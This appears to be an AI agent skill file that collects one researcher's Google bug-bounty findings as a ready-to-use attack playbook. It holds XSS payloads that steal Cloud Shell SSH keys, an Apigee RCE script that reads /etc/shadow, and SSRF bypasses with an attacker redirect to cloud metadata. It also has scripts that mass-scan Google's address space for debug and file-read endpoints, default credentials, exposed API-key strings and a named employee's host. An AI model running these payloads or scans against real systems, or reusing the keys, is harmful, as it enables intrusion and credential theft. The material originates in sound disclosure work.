---
name: google-bughunters-cloud
description: Personal Google VRP reports by omespino — cloud/server-side findings. Cloud Shell instance takeover (XSS .md preview via style onload, LFI uri=file:// in /files/, container escape, SSH key exfiltration, root SSH devshell-vm-*.cloudshell.dev:6000); Cloud Shell XSS via SVG onload + filename injection via launch.json; Apigee Node.js Hosted Target RCE as root via child_process.exec; Blind SSRF via GCP Uptime Check (0.0.0.0 + redirect to [::169.254.169.254]); SSRF in AMP Validator → GCP metadata; LFI on Google prod servers as root via /procz?file= (DremelGateway 34.83.45.88, springboard.google.com, UPI India 34.120.121.40, Mobile Harness 100.8.x/108.177.x); debug endpoint enumeration (/labelaclz, /flagz, /procz, /streamz, /statusz, /varz, /reportcardz on 34.x/35.x/100.x/108.x/216.x); Google Fiber FTP anonymous + Telnet default creds. Use alongside google-bughunters-mobile. Spanish triggers — "cloud shell google", "cloud vrp personal", "apigee rce", "gcp metadata ssrf", "debug endpoints google", "procz flagz", "dremelgateway", "springboard google", "google fiber", "uptime check ssrf", "mobile harness server", "mis reportes google cloud".
---

## Personal Google VRP — Cloud / Infrastructure Findings (omespino)

Use alongside `google-bughunters-mobile`.

---

### 1. Google Cloud Shell instance takeover — Root via XSS + Path Traversal + Container Escape + SSH key exfiltration
**Target:** Google Cloud Shell | **PoC:** https://github.com/omespino/gcs_instace_takeover

**Full attack chain:**

#### Step 1 — Sandboxed XSS in .md file preview
- Payload: `<style onload=alert(document.domain)>` in any `.md` file
- The preview sandbox is the embedded Theia editor with full access to all files in the instance

#### Step 2 — LFI / Path Traversal via file:// URI in files endpoint
- Vulnerable endpoint: `https://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///path`
- **Container escape:** using `../` in the path escapes the container root and accesses the host filesystem

#### Step 3 — Exfiltration of critical files
- Read `/etc/hosts` → get the VM hostname
- Read `../id_cloudshell` (outside the container) → get the SSH private key

#### Step 4 — Building the SSH target
- Hostname in `/etc/hosts`: `cs-6000-devshell-vm-XXXX-XXXX-XXXX-XXXX`
- Remove `cs-6000-` prefix and add `.cloudshell.dev`
- Result: `devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev`

#### Step 5 — Root SSH
```bash
ssh -i id_cloudshell -p 6000 root@devshell-vm-XXXX-XXXX-XXXX-XXXX.cloudshell.dev
```

#### Delivery vector
- **"Open in Google Cloud Shell"** button on GitHub — victim clicks → attack runs in their Cloud Shell

**XSS payload (full exfiltration):**
```html
<style onload="{
  var container_url = 'https://' + location.host + '/files/?uri=/etc/ssh/keys/authorized_keys';
  fetch(container_url)
    .then(response => response.json()
      .then(data =>
        fetch('https://' + location.host + '/files/download/?id=' + data.id)
          .then(response => response.text()
            .then(content => document.write('authorized_keys:<br>' + content)))
      )
    )
}">
```

**API chain:**
```
GET /files/?uri=/etc/ssh/keys/authorized_keys  →  { "id": "xxxxx" }
GET /files/download/?id=xxxxx                  →  file content
```

---

### 20. XSS in Google Cloud Shell via SVG onload (Safari) + SSH private key exfiltration
**Target:** https://ssh.cloud.google.com/cloudshell/editor | **Browser:** Safari (macOS Catalina)

**SVG payload:**
```xml
<svg onload="{
  var container_url = 'https://' + location.host + '/files/?uri=../id_cloudshell';
  fetch(container_url)
    .then(response => response.json()
      .then(data =>
        fetch('https://' + location.host + '/files/download/?id=' + data.id)
          .then(response => response.text()
            .then(key => alert(document.domain + '\n\n' + key)))
      )
    )
}" version="1.1" xmlns="http://www.w3.org/2000/svg"></svg>
```

**Safari-specific:** blocks third-party cookies → Cloud Shell opens in new window; XSS executes when closing that tab.

**Consolidated XSS vectors in Google Cloud Shell:**
| Vector | Trigger | Browser | File |
|---|---|---|---|
| `<style onload>` | .md preview | Firefox (CSP off) | xss.md |
| Filename `<img onerror>` in launch.json | Debug Console | Any | `<img onerror=alert(0)>.js` |
| SVG `onload` | .svg preview | Safari | alert.svg |
| `xlink:href` data URI | Click on element | Any | SVG with link |

**SSH key path consistent across all Cloud Shell reports:**
```
/files/?uri=../id_cloudshell        → gets the file ID
/files/download/?id=<id>           → downloads key content
```

---

### 17. XSS in Google Cloud Shell via filename injection in Debug Console (launch.json)
**Target:** https://ssh.cloud.google.com/cloudshell/editor

**Create malicious filename:**
```bash
touch "<img src=0 onerror=alert(0)>.js"
```

**Inject into launch.json:**
```json
{
  "configurations": [{
    "type": "node",
    "request": "launch",
    "name": "XSS Debug console",
    "program": "${workspaceFolder}/<img src=0 onerror=alert(0)>.js"
  }]
}
```

**Why it works:** The Theia Debug Console renders the `program` field of `launch.json` as HTML without sanitization.

**Generalization:** Web IDEs (Theia, VS Code Web, Cloud9, Jupyter) that render filenames as HTML in file explorers or debugger panels.

---

### 18. RCE as root in Apigee via Node.js Hosted Target — feature abuse
**Target:** apigee.com (Google Apigee API Management)

**Node.js payload (proxy index.js):**
```javascript
var http = require('http');
const { exec } = require('child_process');

var svr = http.createServer(function(req, resp) {
  resp.setHeader('Content-Type', 'application/json');
  exec('id; cat /etc/shadow', (error, stdout, stderr) => {
    resp.end('RCE output:\n\n' + stdout);
  });
});
svr.listen(process.env.PORT || 3000, function() {});
```

**Steps:**
1. `Develop > API Proxies > +Proxy → Hosted Target → Quick Start`
2. Deploy to "prod"
3. `Edit proxy → Develop tab → Resources/hosted/index.js`
4. Replace with payload → Save → visit the proxy URL

**Impact:** `/etc/shadow` readable = running as root.

**Pattern:** Look for "hosted targets", "serverless functions", "custom scripts" features in SaaS/PaaS — if they allow code execution with inadequate sandboxing → RCE.

---

### 16. Blind SSRF oracle via GCP Cloud Monitoring Uptime Check — 0.0.0.0 bypass + redirect to GCP metadata

**Localhost bypass — `0.0.0.0` evades the blocklist:**
- Filter blocks `127.*`, `169.*`, `10.*`, `172.*` — `0.0.0.0` resolves to localhost

**TCP SSRF config:**
```
Protocol: TCP
Hostname: 0.0.0.0
Port: 22
Response Content: "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10"
```
- `checkPassed: true` = content matched (boolean 1-bit oracle)

**Character-by-character exfiltration:**
```python
charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.-_ "
known = "SSH"
# if checkPassed: true → extend known + char; else continue
```

**Redirect chain bypass → `[::169.254.169.254]` → GCP metadata:**
```php
<?php
// 302.php on attacker server
$location = 'http://[::169.254.169.254]'; // IPv4-mapped IPv6 — not in blocklist
$path = '/computeMetadata/v1/project/project-id';
header('Location: ' . $location . $path, TRUE, 302);
?>
```

**Uptime check config:**
```
Protocol: HTTP
Hostname: omespino.com  (own server with 302.php)
Path: /302.php
Custom Headers: Metadata-Flavor: Google
```

**0.0.0.0 bypass variants:**
| Bypass | Notes |
|---|---|
| `0.0.0.0` | Resolves to localhost, generally not filtered |
| `0177.0.0.1` | Octal of 127.0.0.1 |
| `2130706433` | Decimal of 127.0.0.1 |
| `[::169.254.169.254]` | IPv4-mapped IPv6 — bypasses literal filter |

---

### 9. SSRF in AMP Validator → GCP metadata exposure (169.254.169.254)
**Target:** https://validator.ampproject.org/

**Payload:**
```
http://169.254.169.254/?recursive=true&alt=text
```

**Data exposed:** instance/id, region, zone, numericProjectId, projectId, serviceAccounts email + scopes.

**Key GCP metadata parameters:**
- `?recursive=true` → all metadata as tree
- `&alt=text` → plain text
- `Metadata-Flavor: Google` header for `/v1/` endpoints

**Full payloads per cloud:**
```
# GCP
http://169.254.169.254/?recursive=true&alt=text
http://metadata.google.internal/computeMetadata/v1/?recursive=true  (+ Metadata-Flavor: Google)

# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01  (+ Metadata: true)
```

---

### 8. Googler personal dev machine exposed — UPI India payment gateway + LFI as root (HTTPS/443)
**Target:** 34.120.121.40:443 | **System:** UPI India Payment Gateway sync service

**`/statusz` reveals:** `Built on rathivivek@linuxcloudtop1.c.googlers.com:/google/src/cloud/rathivivek/...` → Googler's personal cloud workstation + critical India UPI payment system infra.

**`/streamz` root confirmation:**
```
hostname: sync-service-7d4965ddb9-rh7tq   ← Kubernetes pod
unix_user: root
```

**LFI endpoints:**
```
https://34.120.121.40/procz?file=/proc/self/environ
https://34.120.121.40/procz?file=/proc/self/maps
https://34.120.121.40/reportcardz
```

**Kubernetes indicators in debug endpoints:** hostname pattern `<service>-<hash>-<pod>` → k8s pod.

---

### 7. Internal Google Mobile Harness dashboard exposed + LFI — /streamz (2026)
**Target:** 108.177.0.8:9999 | **System:** Google Mobile Harness (device testing infra)

**`/streamz` exposes:**
```
binary_name: com.google.devtools.mobileharness.infra.lab.LabServerLauncher
hostname:    192.168.95.1   ← internal IP
unix_user:   g00gl3          ← internal service account
```
Internal systems in the tree: Chubby, Monarch, Fireaxe, privacy/ddt.

**LFI:**
```
http://108.177.0.8:9999/procz?file=/proc/self/environ
http://108.177.0.8:9999/procz?file=/proc/self/maps
```

**Full debug endpoint inventory:**
| Endpoint | Information |
|---|---|
| `/labelaclz` | Owner, policy (OPEN/OWNER_ONLY), root confirmation |
| `/flagz` | Config flags, API keys, internal domains |
| `/procz?file=` | **LFI** — reads arbitrary system files |
| `/statusz` | Server state, build label, BNS address |
| `/streamz` | Metrics tree, binary name, internal hostname, unix_user |
| `/varz` | Internal process variables |
| `/reportcardz` | Internal service reports |
| `/java/statusz`, `/java/procz`, `/java/labelaclz` | Java variants |

**Ports with real findings:** 80 (34.94.39.119, 35.227.157.158), 443 (34.120.121.40), 2222/7777 (34.83.45.88), 8080 (34.75.135.42), 9999 (108.177.0.8, 100.8.125.10).

**Users observed:**
| User | System |
|---|---|
| `root` | DremelGateway, Mobile Harness, sync-service |
| `gws-prod` | Google Web Server (Google Search) |
| `g00gl3` | Mobile Harness device testing |
| `chrome-proxy` | Chrome ConnectProxy |

**Discovery workflow:**
```bash
# Get Google ASN IPs
whois -h whois.radb.net -- '-i origin AS15169' | grep route | awk '{print $2}'

# Scan debug ports
nmap -p 80,443,2222,7777,8080,8888,9090,9999 --open <range> -oG scan.txt

# Test all debug endpoints
for ip_port in $(cat scan.txt | grep "open" | awk '{print $2":"$NF}'); do
  for ep in labelaclz flagz statusz streamz procz varz reportcardz; do
    curl -s --max-time 3 "http://$ip_port/$ep" | grep -q "Owner Name\|root\|google\|unix_user" && echo "HIT: $ip_port/$ep"
  done
done
```

---

### 6. Google Fiber — FTP anonymous + Telnet default creds on servers and network printers
**Target:** Google Fiber ASN | **IPs:** 136.61-63.x.x, 23.228.141.x

**Vector 1 — FTP anonymous:**
```bash
ftp 136.32.102.4
# user: anonymous / password: anonymous
```

**Vector 2 — Telnet default creds:**
```bash
telnet 23.228.141.115 23
# password: access / user: admin
```

**Default credentials:**
| Vendor | Protocol | User | Password |
|---|---|---|---|
| Brother/HP printer | Telnet | admin | access |
| Generic FTP | FTP | anonymous | anonymous |

**Discovery:** `nmap -p 21,23 --open <range> --script ftp-anon,telnet-encryption`

---

### 2. LFI on DremelGateway as ROOT — API keys exposed
**Target:** 34.83.45.88:7777 and 34.83.45.88:2222

**`/labelaclz`:** confirms `Owner Name: root`
**`/flagz`** — internal Google API keys exposed:
```
--dremel_api_key=AIzaSyAdMLkLUa1Xc184-BHZFYwZgJVUUYKsFNE
--service_api_key=AIzaSyCXPqYgq2pLwmm1gbP-zGbcb_7hXhDLVDM
--dremel_cloud_bigtable_request_api_key=AIzaSyC6bx_2nNWPebVTnHasmCB-DIN4Aptj74M
--cell_domain=.prod.google.com.
--corplogin_server=https://login.corp.google.com
```

**LFI via `/procz?file=`:**
```
/proc/self/environ    → env vars (API keys, SA credentials)
/proc/self/cmdline    → startup arguments
/proc/self/maps       → memory map
/proc/cpuinfo / /proc/meminfo / /proc/version / /proc/net/netstat
```

---

### 4. Auth bypass + LFI on springboard.google.com — GWS production (Google Search servers)
**Target:** springboard.google.com/java/* | **User:** gws-prod

**Endpoints without auth:**
```
/java/statusz      → GWS server state panel
/java/labelaclz    → owner: gws-prod, policy: OPEN
/java/procz        → full LFI without auth
```

**LFI:**
```
https://springboard.google.com/java/procz?file=/proc/self/environ
https://springboard.google.com/java/procz?file=/proc/cpuinfo
https://springboard.google.com/java/procz?file=/proc/self/maps
```

**`/java/statusz` reveals:**
- BNS: `/bns/pw/borg/pw/bns/gws-prod/gws1.serve/242`
- Load balancer: each refresh hits a different backend (`pwit4`, `pwon26`, `pwgn3`, `pwmk25` — all in `*.prod.google.com`)
- Build label: `gws_20190326-0_RC1`, changelist `240294144`
- Internal depot: `//depot/branches/gws_release_branch/...`

**Critical indicator:** if `/labelaclz` responds without auth → try `/procz?file=` immediately.

---

### 3. LFI on Google server as ROOT — port 80
**Target:** 34.94.39.119:80

**Key difference:** standard port 80 (not 7777/2222) + `Default LabelACL Policy: OPEN` = unrestricted access.

**Pattern confirmed across multiple IPs:**
- 34.83.45.88:7777/2222 → DremelGateway, OWNER_ONLY, with /flagz + internal API keys
- 34.94.39.119:80 → OPEN policy, standard port
- 35.227.157.158:80 → same CDD date (`Tue Jul 2 13:30:04 2019`) → same service deployed in batch

**Same CDD date = batch deployment → scan full ASN range for additional instances.**

**Mass recon:**
```bash
whois -h whois.radb.net -- '-i origin AS15169' | grep route
nmap -p 80,443,2222,7777,8080,8443,9090 <range> --open -oG output.txt
for ip in $(cat ips.txt); do curl -s "http://$ip/labelaclz" | grep "Owner Name" && echo $ip; done
```

---

### 12. Mobile Harness Lab Server LFI as root — (100.x.x.x range, port 9999)
**Target:** 100.8.125.10:9999 | **Reward:** $3,133.70 | **System:** Mobile Harness Lab

**100.x.x.x range (CGNAT/RFC 6598) reachable from internet = misconfigured network route.**

**Root confirmation via `/proc/self/environ`:**
- `SUDO_GID=0` and `SUDO_USER=root` = process running as root via sudo

**`/varz` confirms prod:**
```
built-at search-build-search-infra@otci17.prod.google.com:/google/src/cloud/buildrabbit-username/...
```

**"Not hosted on Borg"** in `/statusz` = less security oversight → more likely to have exposed debug endpoints.
